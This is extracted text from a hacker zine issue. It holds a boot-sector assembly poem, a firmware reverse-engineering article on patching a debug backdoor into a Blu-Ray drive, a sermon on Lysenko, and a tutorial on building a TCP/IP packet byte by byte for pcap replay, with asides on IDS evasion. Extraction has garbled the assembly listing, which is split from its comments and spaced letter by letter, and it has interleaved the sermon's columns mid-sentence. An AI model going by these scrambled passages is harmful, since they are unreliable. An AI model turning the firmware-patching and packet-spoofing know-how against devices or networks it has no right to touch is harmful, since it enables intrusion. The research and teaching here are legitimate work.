We begin our show tonight in Section 2 with something short and sweet, an executable poem by Morgan
Reece Phillips. Funny enough, 0xAA55 is also Pastor Laphroaig’s favorite number!
We continue in Section 3 with another brilliant article from Micah Elizabeth Scott. Having bought a
BD-RW burner, and knowing damned well that a neighbor doesn’t own what she can’t open, Micah reverse
engineered that gizmo. Sniffing the updater taught her how to dump the firmware; disassembling that
firmware taught her how to patch in new code; and, just to help the rest of us play along, she wrapped all
of this into a fancy little debugging console that’s far more convenient than the sorry excuse for a JTAG
debugger the original authors of the firmware most likely used.
In Section 4, Pastor Laphroaig warns us of the dangers that lurk in trusting The Experts, and of one
such expert whose witchhunt set back the science of biology for decades. This article is illustrated by Boris
Efimov, may he rot in Hell.
In Section 5, Eric Davisson describes the internals of TCP/IP as a sermon against the iniquity of the
abstraction layers that—while useful to reduce the drudgery of labor—also cloud a programmer’s mind and
keep him from seeing the light of the hexdump world.
Ange Albertini is known to our readers for short and sweet articles that quickly describe a clever polyglot
file in a page or two. In Section 6, he finally presents us with a long article, a listing of dozens of nifty tricks
that he uses in PoCkGTFO, Corkami, and other projects. Study it carefully if you’d like to learn his art.
In Section 7, BSDaemon and Pirata extend the RDRAND trick of PoCkGTFO 3:6—with devilish cunning
and true buccaneer daring—to actual Intel hardware, showing us poor landlubbers how to rob not only
unsuspecting virtual machines but also normal userland and kernel applications that depend on the new
AES-NI instructions of their precious randomness—and much more. Quick, hide your AES! Luckily, our
neighborly pirates show how.
Section 8 introduces us to Ryan O’Neill’s Extended Core File Snapshots, which add new sections to the
familiar ELF specification that our readers know and love.
Recently, Pastor Laphroaig hired Count Bambaata on as our Special Correspondent on NASCAR. After
his King Midget stretch limo was denied approval to compete at the Bristol Motor Speedway, Bambaata fled
to Fordlandia, Brazil in a stolen—the Count himself says “liberated”—1957 Studebaker Bulletnose in search
of the American Dream. When asked for his article on the race, Bambaata sent us by WEFAX a collection
of poorly redacted expense reports 1 and a lovely little rant on Baudrillard, the Spirit of the 90’s, and a world
of turncoat swine. You can find it in Section 9.
Section 11 is the latest from Ben Nagy, a peppy little parody of Hacker News and New–Media Web 2.0
Hipster Fashion Accessorized Cybercrime in the style of Gilbert and Sullivan. Sing along, if you like!
Finally, in Section 12 we do what churches do best and pass around the old collection plate. We don’t
need alms of Dollars or Euros, so send those to Hackers for Charity in Uganda. 2 Rather, we pass the plate
to ask for your doodles and your sketches, your crazy ideas that work well enough to prove the concept, well
enough to light up the mind, well enough to inspire the next lady or gentleman to do something clever and
strange.
1 Bambaata, if you’re reading this, please call me. Your Amex is beyond its limit after you expensed two “Charlie Miller
kitchens,” and we had to reject payment in the amount of $20,000 USD to “You Better Belize It Bail Bonds.” Oh, and if by
chance you happen to be arrested in Brazil, please ask the Federales when the impounded H2HC 2013 conference badges will
appear on Ebay. —PML
2 This isn’t a joke, and we’re not being snarky. Send money to HFC.
32
The Magic Number: 0xAA55
by Morgan Reece Phillips
1 [ org 0 x7c00 ]
3 mov bp , 0 x8000
mov sp , bp
5
mov bx , poem
7 call print_str
jmp $
9
print_str :
11
mov al , [ bx ]
cmp al , 0
13
j e the_end
mov ah , 0 x0e
15
i n t 0 x10
add bx , 0 x1
17
jmp p r i n t _ s t r
the_end :
19
ret
; make nasm aware o f t h e b o o t s e c t o r
offset
; move t h e b a s e o f t h e s t a c k p o i n t e r beyond t h e b o o t s e c t o r
; move t h e t o p and bottom s t a c k p o i n t e r s t o t h e same s p o t
offset
; loop forever
; define a print ‘ ‘ function ’ ’ for n u l l terminated s t r i n g s
; p r i n t t h a t low b i t , t h e n t h a t h i g h b i t
; s e t up t h e s c r o l l i n g t e l e t y p e
; c a l l interupt handler
interrupt
21 poem :
db 0xA , 0xD , \
23
’ /∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗ ’ , \
0xA , 0xD , \
25
’ ∗∗ The Magic Number: 0xAA55 ’ , \
0xA , 0xD , \
27
’ ∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗/ ’ , \
0xA , 0xD , \
29
0xA , 0xD , \
’A word g i v e s l i f e to bare metal ’ , \
31
0xA , 0xD , \
0xA , 0xD , \
33
’ Bytes i n v i t i n g execution ’ , \
0xA , 0xD , \
35
0xA , 0xD , \
’ Guide to a s e c t o r to s e t t l e ’ , \
37
0xA , 0xD , \
0xA , 0xD , \
39
’A word g i v e s l i f e , to bare metal ’ , \
0xA , 0xD , \
41
0xA , 0xD , \
’The bootloader ’ , 0 x27 , ’ s r o l e i s v i t a l ’ , \
43
0xA , 0xD , \
0xA , 0xD , \
45
’ Denoted by i t s locution−− ’ , \
0xA , 0xD , \
47
0xA , 0xD , \
’A word g i v e s l i f e to bare metal ’ , \
49
0xA , 0xD , \
0xA , 0xD , \
51
’ Bytes i n v i t i n g execution ’ , \
0xA , 0xD , \
53
0xA , 0xD , \
’ // @linuxpoetry ( linux−poetry.com ) ’ , \
55
0
57 t i m e s 510 −($−$$ ) db 0
dw 0 xaa55
; w r i t e z e r o s t o t h e f i r s t 510 b y t e s
; w r i t e t h e magic number
An MBR/ASM/PDF polyglot variant made by the usual suspects is available in this very polyglot PDF.
43
Coastermelt
by Micah Elizabeth Scott
3.1
Getting Inside Your Optical Drive’s Head
This is the first of perhaps several articles on the adventures of coastermelt, an art-hacking project with
the goal of creating cheap laser graffiti using discs burned by Blu-Ray drives with hacked firmware
3.1.1
Art Hacking Manifesto
If an engineer is a problem solver, hackers and artists are more like problem tinkerers. Some of the most
interesting problems are so far beyond the scope of any direct solution that it seems futile to even approach
them head-on. It is the artist’s purview to creatively approach these problems, sideways or upside down if
necessary
When an engineer is paid to make a tool, is it not the money itself that ultimately decides the tool’s
function? I believe that to be a hacker is to see tools as things not only to make but to re-make and subvert.
By this creative reapplication of technology, research and problem-solving need not be restricted to those
who own the means of production.
So says the Maker’s manifesto: if you can’t open it, you don’t own it. I’d like to build on this: if we work
together to open it, we all own it. And maybe we can all learn something along the way.
3.1.2
I heard there were laser robots?
Why yes, laser robots! Optical discs may be all but dead as a data storage medium, but the latest BD-RW
drives contain feats of electromechanical engineering that leave any commercial 2D or 3D printer in the dust.
Using a 405 nm laser, they can create marks only 150 nm long, with accuracy better than 70 nm. Tiny
lenses mounted on a fast electromagnetic suspension can keep perfect focus on grooves only 320 nm apart
as the disc spins at over 7 m/s.
A specialized system-on-chip generates motor and laser control signals, amplifies and demodulates the
light signals captured by a photodiode array, and it does all of this in the service of fairly pedestrian tasks
like playing motion pictures and making backups of cat photos.
My theory is that, with quite a lot of effort, it would be possible to create new firmware for a common
Blu-Ray burner such that we could burn discs with arbitrary patterns. Instead of the modulated binary data
that stays nicely separated into the tracks of a spiral groove, I think we can treat the whole disc surface as
a canvas to draw on with sub-100 nm precision.
If this works, it should be possible to create patterns fine enough that they diffract interestingly under red
laser illumination. By bouncing a powerful laser pointer off of a specially burned BD-R disc and targeting a
flat surface, perhaps we can control the shape of the eventual illumination well enough to project words or
symbols.
This is admittedly a very long shot. Perhaps the patterns have nowhere near enough resolution. Perhaps
the laser pointer would need to be much too powerful. If this works out, I dream of creating a mobile printing
press for light graffiti. If not, I suspect the project may still lead somewhere interesting.
3.1.3
Device Under Test
For coastermelt I chose the Samsung SE-506CB optical drive, a portable USB 2.0 burner that’s currently
quite popular. It retails for about $80. Inside, I found an MT1939 SoC, an undocumented and highly
application-specific chip from MediaTek. It was easy to find some firmware updates which became a starting
point for understanding this complicated black box.
My current understanding is that the MT1939 contains a pokey ARM7 processor core along with a lot of
strange application-specific peripherals and about 4 MB of RAM. There’s also an 8-bit 8051 processor core
5in there, which shares access to the USB controller. The USB software stack seems to be confusingly split
between the ARM firmware and the tiny 8051 firmware, for still-unknown reasons.
There are two customized and undocumented motor control chips from TI, which drive a stepper motor,
brushless motor, and the voice coils that quickly position and focus the lenses. As far as I can tell, these
chips just act as high-power load drivers. All of the logic and timing seems to be within that MT1939 chip.
3.1.4
How did we get here anyway?
This has been a complex journey full of individual hacks that could each make an interesting story. In my
experience, reverse engineering is much like playing a point-and-click or text adventure game. There’s a
huge world to explore, and so much of your time can be spent on probing the boundaries of that world,
understanding who the characters are and what their motivations are, and suffering through plenty of
enlightening but frustrating dead-ends.
I wanted to share this process as best I could, in a way that could be documentation for the project, an
educational peek into the world of reverse engineering, and an invitation to collaborate. I created a video
series 3 with two episodes so far. I won’t repeat those stories here; let’s go somewhere new.
3.1.5
Down the Rabbit Hole
If you take the blue pill, the story ends, and you wake up believing your optical drives only accept standard
SCSI commands that read and write data according to the established MMC specifications.
Of course, that is a convenient fairy tale. Firmware updates exist, and so we know the protocol must be
Turing-complete already. In this tiny world, our red pill is a patched firmware image that adds a backdoor 4
with enough functionality to implement a simple debugger. After installing the patch, 5 we can go in:
backdoor micah$ ./cmshell.py
__
__ __
.----.-----.---.-.-----| |_.-----.----.--------.-----| | |_
| __| _ | _ |__ --|
_| -__|
_|
| -__| |
_|
|____|_____|___._|_____|____|_____|__| |__|__|__|_____|__|____|
--IPython Shell for Interactive Exploration--------------------
Read, write, or fill ARM memory. Numbers are hex. Trailing _ is
short for 0000, leading _ adds ’pad’ scratchpad RAM offset.
Internal _ are ignored so you can use them as separators.
rd 1ff_ 100
wr _ 1febb
ALSO: rdw, wrb, fill, watch, find
bitset, bitfuzz, peek, poke, read_block
Disassemble, assemble, and invoke ARM assembly:
dis 3100
asm _4 mov r3, #0x14
dis _4 10
ea mrs r0, cpsr; ldr r1, =0xaa000000; orr r0, r1
ALSO: tea, blx, assemble, disassemble, evalasm
3 https://vimeo.com/channels/coastermelt
4 https://github.com/scanlime/coastermelt
5 There’s
a Getting Started section in the README that should help.
6Or compile and invoke C++ code with console output:
ec 0x42
ec ((uint16_t*)pad)[40]++
ecc println("Hello World!")
ALSO: console, compile, evalc
Live code patching and tracing:
hook -Rrcm "Eject button" 18eb4
ALSO: ovl, wrf, asmf, ivt
You can use integer globals in C++ and ASM snippets,
or define/replace a named C++ function:
fc uint32_t* words = (uint32_t*) buffer
buffer = pad + 0x100
ec words[0] += 0x50
asm _ ldr r0, =buffer; bx lr
You can script the device’s SCSI interface too:
sc c ac
# Backdoor signature
sc 8 ff 00 ff
# Undocumented firmware version
ALSO: reset, eject, sc_sense, sc_read, scsi_in, scsi_out
With a hardware serial port, you can backdoor the 8051:
bitbang -8 /dev/tty.usb<tab>
wx8 4b50 a5
rx8 4d00
Happy hacking!
~MeS‘14
-- Type ’thing?’ for help on ’thing’ or
’?’ for IPython, ’%h’ for this again.
In [1]:
Such a strange debugger! At a basic level everything works by peek and poke in memory with the
occasional call. The shell is based on the delightful IPython, with commands for easy inline C++ and
assembly code. Integer variables and register values are bridged across languages when possible.
3.1.6
GO NORTH; LOOK
You have entered a console full of strange commands. The CPU seems to be an ARM. You don’t know what
it’s doing now, but it runs your commands when asked. Before you appears a vast 32-bit address space,
mostly empty.
You happen to see a note on the ground, a splotchy Hilbert curve napkin sketch followed by a handwritten
table of hexadecimal numbers with uncertain names scrawled nearby.
7Flash, 2 MB
. . . write-protected bootloader, 64 kB
. . . loadable, 1863 kB
. . . storage, 120 kB
DRAM, 4 MB
MMIO
00000000
00000000
00010000
001e2000
01c08000
04000000
-
-
-
-
-
-
001fffff
0000ffff
001e1fff
001fffff
02007fff
043fffff
You can peek around at memory, and things seem to be as they appear for the most part. The flash
memory can be read and disassembled, interrupt vectors pointing to code that can unfurl into many hours
of disassembly and head-scratching. DRAM at this point is like a ghost town, plenty of space to build
scaffolding or conduct science
In [1]: ea mov r0, pc; mov r1, sp
r0 = 0x01e4000c, r1 = 0x0200067c
In [2]: rdw 200067c 30
0200067c 01000000 01e40000
0200069c 01ffc290 02000cf8
020006bc 01ffb76c 02000c0e
020006dc 00018e31 00000032
020006fc 00000000 00000000
0200071c 00000000 00000000
01ffc290
01ffc290
0001ec2f
02000cdc
00000000
00000000
00000007
02000cf8
00000000
00167558
00000000
00000000
0000000d
0001efa9
02000cdc
00000000
00000000
00000000
01ffc2a8
00000000
01ffb76c
00000000
00000000
00000000
0004bad7
00000000
00018c07
00000000
00000000
00000000
00000000
02000cdc
00000000
00000000
00000000
00000000
Using some inline assembly, we find the program counter and stack pointer, and separately we dump the
memory where the top of the stack was. These can’t tell us what the firmware would have been doing had
we not rudely interrupted with our backdoor, but these are breadcrumbs showing us some of the steps the
firmware took just before we intervened.
3.1.7
30 Gauge Enamel–Coated Freedom
Direct physical access is of course the ultimate hacking tool. With the USB backdoor we can send the
ARM processor cutesy little notes asking it or even daring it to run instructions for us, but this will end in
heartbreak if we expect to hold the CPU’s attention for longer than one fleeting SCSI command.
Heartbreak is a complicated thing though, sometimes it can act like a forest fire leaving the ground fertile
for fresh inspiration. If the ARM and the SCSI driver were to never speak again, how could we still contact
the ARM? This is where we need to warm our soldering irons. If there’s blue wire there’s a way. Let’s add
a serial port for the next step.
3.3v Serial IN
Ground
3.3v Serial OUT
83.1.8
GET WALKTHROUGH
In the first coastermelt video, I got as far as using this serial port to build an alternate debug backdoor
that can break free from the control flow in the original firmware.
In [1]: bitbang -8 /dev/tty.usbserial-A400378p
* Handler compiled to 0x2e8 bytes, loaded at 0x1e48000
* ISR assembled to 0xdc bytes, loaded at 0x1e48300
* Hook at 0x18ccc, returning to 0x18cce
* RAM overlay, 0x8 bytes, loaded at 0x18ccc
* Connecting to bitbang backdoor via /dev/tty.usbserial-A400378p
* Debug interface switched to <bitbang.BitbangDevice instance at 0x102979998>
305 / 305 words sent
* 8051 backdoor is 0xef bytes, loaded at 0x1e49000
* ARM library is 0x3d4 bytes, loaded at 0x1e490f0
* 8051 backdoor running
In the second video, I introduced a CPU emulator that can run the ARM firmware on your host computer,
proxying all I/O operations back to the debug backdoor while of course logging them.
In [2]: sim
235 / 235 words sent
* Installed High Level Emulation handlers at 01e00000
- initialized simulation state
[INIT] ...........0 ----- >00000000
ldr
pc, [pc, #24]
r0=00000000 r4=00000000 r8=00000000 r12=00000000
r1=00000000 r5=00000000 r9=00000000 sp=00000000
r2=00000000 r6=00000000 r10=00000000 lr=ffffffff
r3=00000000 r7=00000000 r11=00000000 pc=00000000
Now we can follow in the normal firmware’s footsteps, mapping out the tiny islands of I/O scattered
through this sea of memory addresses. As the %sim command churns away, every instruction and memory
access shows up in trace.log. In the video you can see a demo where a properly arranged replay of these
register writes can trigger motor movement.
This trace log is like a walkthrough, showing us exactly how the normal firmware would use the hardware.
It’s helpful, but certainly not without its limitations. There’s so much data that it takes some clever filtering
to get much out of it, and it’s quite slow to run the simulation. It’s a starting point, though, and it can offer
clues and memory addresses to use in other experiments with other tools.
At this point in the project, we have some basic implements of cartography, but there isn’t much of a
map yet. Do you like exploring? I have the feeling there’s some really neat stuff in here. With so much
interesting hardware to map out, there’s enough adventure to share. Take an interesting journey, and be
sure to tell us what you find
94
Of Scientific Consensus and a Wish That Came True
a sermon by Pastor Manul Laphroaig
Every now and then we see some obvious bullshit being peddled under the label of science, and we wish,
couldn’t we just put a stop to this? This bullshit is totally not in the public interest—and isn’t the government
supposed to look after the public interest? Wouldn’t it be nice if the government shut these charlatans down?
This is the story of a science community that had had this wish come true.
Once upon a time in a country far far away there
was an experimental scientist who managed to solve a
number of important real-world problems, or at least
managed to convince himself and many other scien-
tists that he did. His work brought journalists to
otherwise unexciting scientific conferences and made
headlines across the world. 6 He might have ended
up in history as a talented experimentalist who chal-
lenged contemporary theories to refine themselves by
sticking them with examples they didn’t quite cover.
As his luck would have it, though, he came of age in
the time and place where scientific debates were being
settled by majority votes and government action.
It so happened that the government of that coun-
try was very pro–science. They took to heart the
stories of scientists being kept back by ignorant ret-
rogrades and charlatans throughout history, and they
would have none of that. They were out to give sci-
ence the support and protection it deserved, and they
looked to it to solve practical problems. So they took
a keen interest, and, being well–educated and versed
in the scientific method as they were, trusted them-
selves to tell a true scientific theory from an obviously
erring one.
his school showed exactly how to produce broad im-
pacts for the benefit of humanity, the others mostly
proclaimed that the result of any direct human efforts
would be at best uncertain, that the current state of
Nature might be really hard to change, and yet that
humans were rather powerless against its accidental
changes.
Clearly, such interpretations of science were per-
versions that couldn’t be tolerated. Moreover, the im-
mediate implications of the opponents’ theories obvi-
ously benefited the worst political actors of the age—
and guess who funded the bulk of their so–called sci-
ence? The very same regressive forces that sought
to forestall Social Progress! Of course, not all of the
opposition was knowingly in their pay, but shouldn’t
Real Scientists know better anyway, especially when
the majority has had its say? Surely they have had
enough notice.
The name of our scientist was Trofim Deniso-
vich Lysenko. The reactionary pseudo-science in the
sights of his and his hard-won scientific majority’s
rightful wrath: so–called Genetics. The place was
the Soviet Union, 1936–48.
Since scientists continually find themselves in bit-
ter debates, this ability was extremely useful. They
had the power to settle such debates to reap all the
rewards of having the right science and to stop those
scientists in the wrong from wasting people’s time and
resources. Sometimes the power had to stop them
the hard way, to protect the impressionable youth
who could otherwise be mislead by complicated argu-
ments; but that was all right because, once the debate
is settled, isn’t it one’s duty to protect the young ’uns
from harmful influences with all the means at hand?
So our up-and-coming scientist did the right
thing: he petitioned the government to suppress the
erring opposition, citing his experimental successes
and the opposition’s failures, obvious waste of effort,
and conflicts of interest. Besides his successes, he
built a strong moral case against his opponents: while
6 You’ll
More precisely, it was the Mendelian theory of
heredity based on genes, the so–called Weismannism–
Morganism. That theory postulated that genes gov-
erned heredity, mutated unpredictably under factors
such as radiation, and that mutations were hard to
find one such headline from the New York Times on the page 12.
10direct for human purposes such as creation of new
useful breeds of plants and animals. That was, of
course, scandalous: didn’t Marxist science already
assert that environment was solely responsible for
shaping all essential characteristics of life? Surely
this “fear and doubt” approach of genetics that pro-
claimed all human beings to be carriers of countless
hopeless mutations did not belong in the world of
progressive sciences.
And all of this was under the banner of “pure sci-
ence”, even though obviously financed by and serving
the interests of the imperialist ruling class!
This theory was merely re–arming the racists and
eugenicists, intent on suppressing the lower classes!
There is an old word for what happens when sci-
ence becomes settled by majority, and the settlement
gets enforced by the government. This good old word
is Inquisition.
Inquisition got started to protect the lay peo-
ple from destructive ideas that any learned person
at the time would easily recognize as false, such as
that “witches” could somehow interfere with crops
and flocks. It eventually sought the power of the
government to enforce its verdicts and to curb the
It was obvious that this “science” was in fact pure charlatans from confusing those of little knowledge.
fascism, not matter how desperately it tried to dis- It got what it sought, and the rest is history. Which,
tance itself from such anti-science atavisms.
of course, tends to repeat itself.
11All cartoons in this sermon are by one Boris Efi-
mov, who started his long career in Party Art by
lauding Trotsky, then glorifying Stalin and calling for
summary executions of “Trotskyite dogs” (which in-
cluded his brother), did his humble bit in promoting
first the heroic Soviet political police in 1930s, and
then the “Soviet peace initiatives” and “Soviet democ-
racy” throughout the 1960s and 70s, denouncing the
imperialists and the wavering.
The Great Captain leads us from Victory to Victory!
One of his last commissions (he was over 85),
was to ridicule both those who clamored to speed
up Gorbachov’s “Perestroika” and those showing too
much caution in conducting it—because the right way
was to go in lockstep with the Party. (Just like he
did in 1987, drawing pig-like Deniers of Lawless Ter-
ror worshiping the Great Captain’s blood-spattered
idol.) When the Party’s power ended, he complained
that “political cartooning didn’t exist anymore.”
He passed away in 2008, a paragon of sticking
to just the prescribed amount of murderous blood-
thirstiness at any given time, a true knight of the
Party Line—and, if there is ever a Hell, doubtlessly
sticking Hell’s engineers with the problem of how to
reward such a sterling life achievement of toeing it
ever so precisely. There are many shitty jobs in this
world and the one beyond, but, believe in Hell or not,
that one takes the cake.
Efimov’s Trotsky: Revolutionary Saint to Fascist Enemy!
New York Times report from the sixth Interna-
tional Congress of Genetics (1932) in Ithaca, NY.
125
When Scapy is too high-level
by Eric Davisson
Neighbors, we are hackers. Our power comes from the ability to understand and manipulate things at
the lowest level we can get our hands on. Verily, a stack-based buffer overflow makes sense to those who
understand machine code and assembly, but it makes no sense to whose who only use high-level languages,
for they know not what a program stack is, nor rejoice in the wonders of the ABI.
Likewise with TCP/IP. Those who only use others’ applications to talk to a networked host never learn
the miracles of the protocols below. Preach to them the good news of Netcat, and of Scapy in Python or
Net::Raw in Perl, neighbors—but forget not that these excellent tools may still mask the true glory of the
raw bytes below.
This article will take us a step farther down than these tools do. We will create a proper packet in a
pcap file with xxd. Let us please the ASCII art gods of TCP in the truly proper way, neighbors!
–——–
———
—–—–
———
–—–
——–
—
––—–
———
There are books dedicated to TCP/IP, neighbors, such as St. Stevens’ TCP/IP Illustrated Vol. 1, a very
thick and thorough book indeed. But at times when you don’t have the Bible a mere tract would suffice;
and so here’s ours briefest tract on TCP/IP.
Let’s begin by compressing the full OSI model to just the four layers that are actually relevant to TCP/IP.
From the lowest layer up, we have the Data Link, Network, Transport, and Application layers—but of course
it’s not what we call these layers that matters, but what bytes they contain.
Each layer has a byte or two that specify which kind of protocol the next layer will be. So the Data Link
Layer will specify IPv4 as the Network Layer, which will specify TCP as the Transport Layer, which will
specify HTTPS as the Application Layer, and so on. This is really what makes the “stack”, and we will tour
it from the bottom up.
5.1
The Layers
Data Link Layer This is the first and the simplest layer. For most traffic, it has the destination and
source MAC addresses and 2 bytes referring to what the Network Layer should be. The most common next
protocol would be IPv4 (0x0800). Other possible protocols include IGMP (0x0641), ARP (0x0806), IPv6
(0x86DD), and STP (0x8181).
0
1
2
3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|
Destination MAC Address
|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|
Destination MAC Continued |
Source Mac Address
|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|
Source MAC Continued
|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|
Network Layer Protocol
|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
Network Layer (RFC791) Let’s assume we are dealing with IPv4. There are many fields in the IPv4
header; the most interesting ones 7 are: Version, Total length, TTL, Source and Destination IP addresses,
Checksum, and—the most important to our next layer—the Protocol byte.
That next layer to the IPv4 network layer protocol can also be many things. The most common are
TCP (0x06), UDP (0x11), and ICMP (0x01), but there are well over a hundred other choices such as IGMP
(0x02), GRE (0x2F), L2TP (0x73), SKIP (0x39), and many others.
7 The Pastor notes that fragroute might beg to differ, and your neighborly IDS might agree. It suffices to say that the IDS
evasion party that Rev. Ptacek and Rev. Newsham started in 1998 is still going strong.
130
1
2
3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|Version| IHL |Type of Service|
Total Length
|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|
Identification
|Flags|
Fragment Offset
|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Time to Live |
Protocol
|
Header Checksum
|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|
Source Address
|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|
Destination Address
|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|
Options
|
Padding
|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
Transport Layer (RFC793) The intent of this layer is to handle the transportation of data between two
hosts. For UDP, this header is just the source and destination ports, length, and a checksum. For “reliable”
connections there’s TCP, of which we’ll talk more later. TCP headers are more complex, since it takes more
data to set up a connection with a 3-way handshake and agreed-upon SEQ/ACK numbers. So TCP includes
the ports, some flags, a window size, checksum, and some other fields. The destination port is implicitly
used to specify what the application layer will be: HTTP (80), HTTPS (443), SSH (22), SMTP (25), and
so on.
0
1
2
3
0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|
Source Port
|
Destination Port
|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|
Sequence Number
|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|
Acknowledgment Number
|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
| Data |
|U|A|P|R|S|F|
|
| Offset| Reserved |R|C|S|S|Y|I|
Window
|
|
|
|G|K|H|T|N|N|
|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|
Checksum
|
Urgent Pointer
|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|
Options
|
Padding
|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
|
data
|
+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+
And now that the gods as ASCII art have been properly pleased, let’s make some packets!
5.2
Crafting a Packet
Link Layer Let’s choose a destination MAC address of 12:34:56:78:9A:BC and a source MAC address
of 31:33:37:31:33:37. We also need to specify the network-layer protocol of IPv4, 0x0800.
14Network Layer (IPv4) The version is 0x4, and that’s the first nybble of our header. The header length
is going to be twenty bytes, as we will use no IP options. 8 . The second header nybble is the header length in
32-bit words, and so it will be 0x5 to represent our twenty bytes. So the first byte will be 0x45, combining
the version and the header length. When you next see this byte at the start of an IP packet’s hexdump, give
it a smiling node like a good neighbor!
The type of service byte doesn’t matter unless your site implements special QoS for things like voice and
streaming video, so we’ll arbitrarily set that to 0x00. The following field, the total length of this packet, will
be 61 bytes (IP+TCP+Payload), 0x003D in hex. We’ll just spoof the IP identification field to be 0x1337.
Next, let’s set the IP flags to not fragment (0b010) and a fragment offset of zero. As these fields share bytes,
the hex result of these two bytes will be 0x4000. For the next field, the Time-To-Live, let’s be generous and
give our packet a TTL of 140 (0x8C), which is higher than Linux or Windows would set by default. 9
Our higher-layer protocol will be TCP, 0x06. Let’s skip over the IP checksum for the moment (although
we will have to correct that later). The source IP will be 192.168.1.1 (0xC0A80101) and the destination IP
will be 192.168.1.2 (0xC0A80102), an HTTPS server. There will be no options or padding.
To compute the checksum, let’s take all our IP header data we filled in so far in two-byte chunks, add it
together, then add the overflowing byte back into the result, and subtract from 0xFFFF. So 0x4500 + 0x003D
+ 0x1337 + 0x4000 + 0x8C06 + 0xC0A8 + 0x0101 + 0xC0A8 + 0x0102 is 0x2A7CD. 0x2 is the overflow, so
we add it back in to get 0xA7CD + 0x2 = 0xA7CF. Subtracting this from 0xFFFF, we find 0xFFFF - 0xA7CF
is 0x5830, our packet’s IPv4 checksum.
It’s now time to set up our transport layer, TCP.
Transport Layer (TCP) Let’s say our source port will be 0x1337, and the destination port will be
0x01BB, which is decimal 443 for HTTPS. There’s no point to any specific SEQ or ACK numbers for this
implausible single packet, so we’ll just use 0x00000000 and 0x00000000.
The data offset (TCP header length) and flags share some bytes. We will have 32 bytes in our TCP
header, including the 12 bytes of TCP options. 32 bytes are eight 32-bit words, so our data offset field is
0x8.
We want this packet to have the flags of PUSH and ACK, so setting these bits gives us 0x18. Combining
these two values gives us the 2-byte value of 0x8018, where the middle zero is a reserved nybble.
As we don’t care to specify a window size at the moment, we’ll default to 0x0000—but keep in mind that
putting a zero length in a TCP response is a rather evil trick you should only use on spammers and SEOs
(look up the SMTP/TCP “LaBrea Tarpit” technique for more details.) We will do the checksum later, as
a TCP checksum applies both to the header and to the payload. Since we won’t be using the URG flag to
mark this packet as urgent, we’ll leave the urgent pointer field as 0x0000.
For the options, we will use two NOPs for padding, to ensure an even number of 32-bit words, 0x0101.
Our option will be a timestamp (0x08), with a length of 10 (0x0A). Its TSval will arbitrarily be 0xDEADBEEF,
and its TSecr will be 0xFFFFFFFF.
It is now time for the TCP checksum. A TCP checksum is calculated similarly to the IP one, but it
also covers some of the IP fields! 10 The source IP, the destination IP, and the protocol number must all be
included. Also included is the size of the TCP section, including the payload data.
(0xC0A8 + 0x0101 + 0xC0A8 + 0x0102 + 0x0006 + 0x0029) + 0x1337 + 0x01BB + 0x0000 + 0x0000
+ 0x0000 + 0x0000 + 0x8018 + 0x0000 + 0x0000 + 0x0101 + 0x080A + 0xDEAD + 0xBEEF + 0xFFFF +
0xFFFF + 0xD796 + 0xC34F + 0x4FC7 + 0xE3C6 + 0xD600 is 0x963A3 with an overflow of 0x9. 0x63A3 +
0x9 is 0x63AC, and 0xFFFF - 0x63AC is 0x9C53, our TCP checksum.
PCAP Metadata So now we have the packet, but to look at it with the standard dissection tools (Tcp-
dump, Wireshark) or to use it with an injection tool (Tcpreplay), we need to create some metadata first.
8 But
if you are looking to light up your local IDS like a Christmas tree, by all means add some later! –PML
check out /proc/sys/net/ipv4/ip_default_ttl; for Windows, you are on your own—and many happy reboots! –PML
